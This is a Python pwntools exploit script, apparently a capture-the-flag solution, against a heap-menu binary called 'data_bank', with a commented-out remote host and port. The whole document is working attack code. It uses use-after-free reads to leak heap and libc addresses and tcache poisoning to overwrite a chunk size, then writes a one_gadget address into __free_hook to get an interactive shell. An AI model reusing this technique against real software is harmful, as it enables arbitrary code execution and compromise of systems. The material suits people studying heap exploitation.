from pwn import *

context.terminal = "tmux splitw -h -f".split()
p = process("./data_bank")
#p = remote("35.200.202.92", 1337)
DEBUG = 0
cmd = ""
libc = ELF('./libc.so.6')
if DEBUG:
    gdb.attach(p, cmd, gdb_args=["--init-eval-command='source /ctf/tools/gef/gef.py'"])

def goto(n):
    p.sendlineafter(">> ", str(n))
def add_data(idx, size, data):
    goto(1)
    p.recvline()
    p.sendline(str(idx))
    p.recvline()
    p.sendline(str(size))
    p.recvline()
    p.sendline(str(data))
    return

def delete_data(idx):
    goto(3)
    p.recvline()
    p.sendline(str(idx))
    return

def view_data(idx):
    goto(4)
    p.recvline()
    p.sendline(str(idx))
    p.recvuntil("Your data :")
    data = p.recvuntil("\n\n", drop=True)
    return data

def edit_data(idx, new_data):
    goto(2)
    p.recvline()
    p.sendline(str(idx))
    p.recvline()
    p.sendline(str(new_data))

add_data(0, 0x400, "AAAAAAAAAAAAA")
add_data(1, 20, "BBBBBBBBBBBB")
add_data(2, 20, "BBBBBBBBBBBB")
delete_data(1)
delete_data(2)
leak = u64(view_data(2).ljust(8, "\x00"))
heap_base = leak - 0x670
print(hex(heap_base))
chunk0 = heap_base + 0x258
print(hex(chunk0))
edit_data(2, p64(chunk0)) # Set fd pointer to point chunk's size adress
add_data(3, 20, "CCCCCCCCCCCC")
add_data(4, 20, p64(0x431)) # Overwrite first chunk's size (0x420 + overhead)
delete_data(0) # Delete first chunk, so we get libc address
leak= u64(view_data(0).ljust(8, "\x00"))
base_libc = leak - 4111520
libc.address = base_libc
free_hook = libc.symbols['__free_hook']
print(hex(base_libc))
print(hex(free_hook))
delete_data(3)
edit_data(3, p64(free_hook))
add_data(5, 20, "")
add_data(6, 20, p64(base_libc + 0x4f322))
delete_data(2)
p.interactive()
